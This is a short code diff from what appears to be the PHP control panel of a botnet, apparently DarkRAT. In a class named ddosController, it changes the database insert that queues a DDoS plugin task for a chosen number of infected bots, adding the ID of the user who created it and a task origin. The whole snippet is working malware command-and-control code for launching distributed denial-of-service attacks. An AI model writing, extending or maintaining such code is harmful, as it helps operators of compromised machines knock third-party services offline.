@@ -53,8 +53,8 @@ class ddosController
 
         if (!empty($_POST["load-ddosBots"])) {
 
-            $statement = $GLOBALS["pdo"]->prepare("INSERT INTO tasks (filter, status, command, task, execution_limit) VALUES (?, ?, ?, ?, ?)");
-            $statement->execute(array("", 1, $GLOBALS["task_configuration"]["ddos"]["value"], "runplugin", $_POST["load-ddosBots"]));
+            $statement = $GLOBALS["pdo"]->prepare("INSERT INTO tasks (filter, status, command, task, execution_limit, created_by, origin_from) VALUES (?, ?, ?, ?, ?, ?, ?)");
+            $statement->execute(array("", 1, $GLOBALS["task_configuration"]["ddos"]["value"], "runplugin", $_POST["load-ddosBots"],$_SESSION["darkrat_userid"],"user"));
             header("Location: /ddos");
         }
 
